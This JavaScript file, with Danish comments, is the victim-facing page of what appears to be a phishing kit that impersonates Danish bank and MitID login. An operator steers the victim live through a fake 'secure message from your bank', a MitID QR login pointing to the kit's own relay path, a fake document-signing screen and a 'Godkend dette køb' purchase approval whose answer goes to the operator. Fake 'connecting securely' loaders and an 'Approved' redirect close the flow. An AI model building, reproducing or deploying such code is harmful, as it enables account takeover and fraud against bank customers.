/* ════════════════════════════════════════════════════════════
   display.js — Kunde-siden: komplet bank-login-rejse
   flow: 'besked' (ny besked) -> 'scan' (MitID QR) -> 'wait' (godkender) -> 'approved' (redirect til banken)
   Hvert trin ser ud som den ægte vare; admin styrer rækkenfølgen.
   ════════════════════════════════════════════════════════════ */

let lastSignature = null;
let socketConnected = false;
let qrInstance = null;
let redirectTimer = null;

function signatureOf(state) {
  return JSON.stringify([state.live, state.flow, state.target, state.sessionId, state.title, state.message, state.offlineTitle, state.offlineBody]);
}

/* ── QR-tegning — sort/hvid som originalt ── */
function drawQR(url) {
  const el = document.getElementById('qrcode');
  if (!el) return;
  el.innerHTML = '';

  if (window.QRCodeStyling) {
    qrInstance = new QRCodeStyling({
      width: 176, height: 176, type: 'svg',
      data: url,
      margin: 0,
      qrOptions: { errorCorrectionLevel: 'M' },
      dotsOptions: { type: 'square', color: '#000000' },
      cornersSquareOptions: { type: 'square', color: '#000000' },
      cornersDotOptions: { type: 'square', color: '#000000' },
      backgroundOptions: { color: '#ffffff' }
    });
    qrInstance.append(el);
  } else if (window.QRCode) {
    qrInstance = new QRCode(el, {
      text: url, width: 176, height: 176,
      colorDark: '#000000', colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.M
    });
  }
}

/* ── Hjælpere ── */
function $(id) { return document.getElementById(id); }
function show(el, disp) { if (el) el.style.display = disp || 'block'; }
function hide(el) { if (el) el.style.display = 'none'; }

function restoreChrome(){
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.display = 'flex';
}

/* ════════════════════════════════════════════════════════════
   TRIN 1: 'besked' — "Du har modtaget en ny besked"
   ════════════════════════════════════════════════════════════ */
function showBesked(state) {
  hideWait(); hideAction(); 
  hide($('qrFrame')); hide($('approvedOverlay'));
  restoreChrome();

  $('formHeading').textContent = state.title || 'Du har modtaget en ny besked';
  $('hintText').textContent = state.message || 'Din bank har sendt dig en sikker besked';
  $('qrStatusLine').textContent = '';

  // Erstat QR-zonens indhold med besked-visning
  const zone = $('qrZone');
  if (zone) {
    let b = $('beskedBox');
    if (!b) {
      b = document.createElement('div');
      b.id = 'beskedBox';
      b.className = 'besked-box';
      zone.insertBefore(b, zone.firstChild);
    }
    b.innerHTML = `
      <div class="besked-icon">
        <svg width="44" height="44" viewBox="0 0 24 24" fill="#0060e6" aria-hidden="true">
          <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H5.17L4 17.17V4h16v12z"/>
          <path d="M11 5h2v6h-2zm0 8h2v2h-2z"/>
        </svg>
      </div>
      <div class="besked-title">Ny sikker besked</div>
      <div class="besked-sub">Fra din bank · lige nu</div>
      <button type="button" class="btn-primary" id="beskedFortsaet">
        <span>LÆS BESKED</span>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
      </button>`;
    // FORTSÆT -> kunden "åbner" beskeden -> går til MitID-login (scan)
    b.querySelector('#beskedFortsaet').addEventListener('click', () => {
      // klienten skifter selv til scan-trin (føles som et rigtigt flow)
      window.__pendingFlow = 'scan';
      poll(true);
    });
    b.style.display = 'block';
  }
  // (step-dots fjernet)
}

/* ════════════════════════════════════════════════════════════
   TRIN 2: 'scan' — MitID QR-login
   ════════════════════════════════════════════════════════════ */
function showScan(state) {
  hideWait(); hideAction();
  hide($('beskedBox')); hide($('approvedOverlay'));
  restoreChrome();
  

  $('formHeading').textContent = 'Log på';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  // hint-rækken ("Scan QR-kode med MitID app" + ikon) skjules på scan-siden
  const scanHint = document.querySelector('.qr-hint');
  if (scanHint) scanHint.style.display = 'none';

  const url = state.sessionId
    ? `${window.location.origin}/r/${state.sessionId}`
    : (state.target && state.target.trim() ? state.target.trim() : 'https://mitid.dk');
  drawQR(url);
  show($('qrFrame'), 'inline-block');
}

/* ════════════════════════════════════════════════════════════
   TRIN 2a: 'tekst' — admin viser en fritekst til kunden
   ════════════════════════════════════════════════════════════ */
function showTekst(state) {
  hideWait(); hideAction();
  hide($('qrFrame')); hide($('beskedBox')); hide($('approvedOverlay'));
  restoreChrome();
  

  $('formHeading').textContent = 'MitID Document Signing';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.visibility = 'hidden';

  const zone = $('qrZone');
  if (!zone) return;
  let box = $('tekstBox');
  if (!box) {
    box = document.createElement('div');
    box.id = 'tekstBox';
    box.className = 'esign-box';
    zone.insertBefore(box, zone.firstChild);
  }
  box.innerHTML = `
    <div class="esign-icon">
      <svg width="30" height="30" viewBox="0 0 24 24" fill="#0060e6" aria-hidden="true">
        <path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/>
      </svg>
    </div>
    <div class="esign-title"></div>
    <div class="esign-ref-row"><span class="esign-ref-label">Reference:</span> <span class="esign-ref"></span></div>
    <button type="button" class="esign-btn">CONTINUE</button>`;
  box.querySelector('.esign-title').textContent = state.tekst || '';
  box.querySelector('.esign-ref').textContent = state.sessionId || '—';
  box.querySelector('.esign-btn').addEventListener('click', function(){
    this.textContent = 'CONTINUING ...';
    this.disabled = true;
  });
  box.style.display = 'block';
}

function hideTekst(){
  const box = document.getElementById('tekstBox');
  if (box) box.style.display = 'none';
}

/* ════════════════════════════════════════════════════════════
   TRIN 2b: 'action' — "Godkend dette køb" / "Annullering af betaling"
   ════════════════════════════════════════════════════════════ */
function showAction(state) {
  hideWait(); 
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  restoreChrome();
  clearTimeout(redirectTimer);

  const a = (state.action || {});
  $('formHeading').textContent = 'Confirm action';
  $('hintText').textContent = a.title || 'Godkend dette køb';
  $('qrStatusLine').textContent = '';

  const zone = $('qrZone');
  if (!zone) return;
  let box = $('actionBox');
  if (!box) {
    box = document.createElement('div');
    box.id = 'actionBox';
    box.className = 'action-box';
    zone.insertBefore(box, zone.firstChild);
  }
  box.innerHTML = `
    <div class="action-amount">${escapeHtml(a.amount || '')}</div>
    <div class="action-title">${escapeHtml(a.title || 'Godkend dette køb')}</div>
    ${a.detail ? `<div class="action-detail">${escapeHtml(a.detail)}</div>` : ''}
    <div class="action-divider"></div>
    <div class="action-buttons">
      <button type="button" class="action-btn action-cancel" id="actionCancelBtn">ANNULLER</button>
      <button type="button" class="action-btn action-ok" id="actionOkBtn">GODKEND</button>
    </div>
    <div class="action-security">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="#2e9e5b" aria-hidden="true">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
      </svg>
      <span>Sikker godkendelse via MitID</span>
    </div>`;
  box.style.display = 'block';

  const send = (r) => {
    fetch('/api/action-response', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ response: r })
    }).catch(() => {});
    // straks-feedback på knappen
    const okBtn = $('actionOkBtn'), cancelBtn = $('actionCancelBtn');
    if (r === 'ok') {
      if (okBtn) { okBtn.textContent = 'APPROVED ✓'; okBtn.disabled = true; }
      if (cancelBtn) cancelBtn.disabled = true;
    } else {
      if (cancelBtn) { cancelBtn.textContent = 'CANCELLED ✓'; cancelBtn.disabled = true; }
      if (okBtn) okBtn.disabled = true;
    }
  };
  const okBtn = $('actionOkBtn');
  const cancelBtn = $('actionCancelBtn');
  if (okBtn) okBtn.addEventListener('click', () => send('ok'));
  if (cancelBtn) cancelBtn.addEventListener('click', () => send('cancel'));

  // (step-dots fjernet)
}

function escapeHtml(s) {
  const div = document.createElement('div');
  div.textContent = s || '';
  return div.innerHTML;
}

/* ════════════════════════════════════════════════════════════
   TRIN 3: 'wait' — "Forbinder sikkert til MitID"-loader
   ══════════════════════════════════════════════════════════════ */
function showWait() {
  
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  const loader = $('loaderContainer');
  if (!loader) return;
  loader.style.display = 'flex';
  $('loaderText').textContent = 'Connecting securely to MitID';
  const statuses = ['Approving identity ...', 'Checking information ...', 'Please wait ...'];
  let i = 0;
  $('loaderStatus').textContent = statuses[0];
  clearInterval(window.__loaderTimer);
  window.__loaderTimer = setInterval(() => {
    i = (i + 1) % statuses.length;
    $('loaderStatus').textContent = statuses[i];
  }, 700);
  // (step-dots fjernet)
}
function hideWait() {
  const loader = $('loaderContainer');
  if (loader) loader.style.display = 'none';
  clearInterval(window.__loaderTimer);
}

/* ════════════════════════════════════════════════════════════
   TRIN 4: 'approved' — success + redirect til banken
   ════════════════════════════════════════════════════════════ */
function showApproved(state) {
  hideWait(); 
  hide($('beskedBox')); hide($('qrFrame'));

  $('formHeading').textContent = 'Approved';
  $('hintText').textContent = 'Your identity has been confirmed';
  $('qrStatusLine').textContent = 'Redirecting you ...';
  // (step-dots fjernet)

  let ov = $('approvedOverlay');
  if (!ov) {
    ov = document.createElement('div');
    ov.id = 'approvedOverlay';
    ov.style.cssText = 'position:fixed;inset:0;background:#fff;z-index:2000;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;';
    ov.innerHTML = `
      <svg viewBox="0 0 52 52" width="104" height="104" aria-hidden="true">
        <circle class="ap-ring" cx="26" cy="26" r="24" fill="none" stroke="#2e9e5b" stroke-width="3" stroke-linecap="round" stroke-dasharray="166" stroke-dashoffset="166"/>
        <path class="ap-check" d="M14 27l8 8 16-16" fill="none" stroke="#2e9e5b" stroke-width="4.5" stroke-linecap="round" stroke-linejoin="round" stroke-dasharray="48" stroke-dashoffset="48"/>
      </svg>
      <h2 style="font-size:21px;font-weight:700;color:#1c6b3c;margin:22px 0 8px;font-family:'IBM Plex Sans',Arial,sans-serif;">Approved</h2>
      <p style="font-size:14px;color:#666;max-width:320px;text-align:center;line-height:1.55;font-family:'IBM Plex Sans',Arial,sans-serif;">Your identity has been confirmed. You are now being redirected.</p>
      <style>
        #approvedOverlay .ap-ring { animation: apDraw .6s ease-out forwards; }
        #approvedOverlay .ap-check { animation: apDraw .4s ease-out .55s forwards; }
        @keyframes apDraw { to { stroke-dashoffset: 0; } }
      </style>`;
    document.body.appendChild(ov);
  }
  ov.style.display = 'flex';
  const svg = ov.querySelector('svg');
  if (svg) { const clone = svg.cloneNode(true); svg.replaceWith(clone); }

  // auto-redirect til QR-målet (banken) efter 2 sek
  if (state.target && state.target.trim()) {
    clearTimeout(redirectTimer);
    redirectTimer = setTimeout(() => {
      window.location.href = state.target.trim();
    }, 2000);
  }
}

function hideAction(){
  const box = document.getElementById('actionBox');
  if (box) box.style.display = 'none';
}

/* ── OFFLINE — rent kort, ingen besked ── */
function showOffline(state) {
  hideWait(); 
  hideAction();
  hide($('beskedBox')); hide($('qrFrame')); hide($('approvedOverlay'));
  clearTimeout(redirectTimer);
  $('formHeading').textContent = 'Log on';
  $('hintText').textContent = '';
  $('qrStatusLine').textContent = '';
  const hintRow = document.querySelector('.qr-hint');
  if (hintRow) hintRow.style.display = 'none';
}

/* ── HOVED-RENDER ── */
function render(state) {
  const signature = signatureOf(state);
  if (signature === lastSignature && !window.__pendingFlow) return;
  lastSignature = signature;
  delete window.__pendingFlow;

  const flow = state.flow || 'scan';

  if (!state.live) { showOffline(state); return; }

  if (flow === 'besked')  { hideTekst(); hideWait(); hideAction(); showBesked(state); return; }
  if (flow === 'tekst')   { showTekst(state); return; }
  if (flow === 'action')  { hideTekst(); showAction(state); return; }
  if (flow === 'wait')    { hideTekst(); hideAction(); showWait(); return; }
  if (flow === 'approved'){ hideTekst(); hideAction(); showApproved(state); return; }
  hideTekst(); hideWait(); hideAction();
  showScan(state);
}

/* ── Poll hvert 1. sek + socket ── */
async function poll(force) {
  try {
    const res = await fetch('/api/public-state', { cache: 'no-store' });
    const state = await res.json();
    if (force) state.flow = window.__pendingFlow || state.flow;
    render(state);
  } catch (e) {}
}

poll();

try {
  const socket = io();
  socket.on('connect', () => { socketConnected = true; });
  socket.on('disconnect', () => { socketConnected = false; });
  socket.on('state-update', render);
} catch (e) {
  // socket.io utilgængelig — 1-sek pollering dækker
}

setInterval(() => poll(), 1000);

// Kiosk-genlad efter 1 time
setInterval(() => window.location.reload(), 60 * 60 * 1000);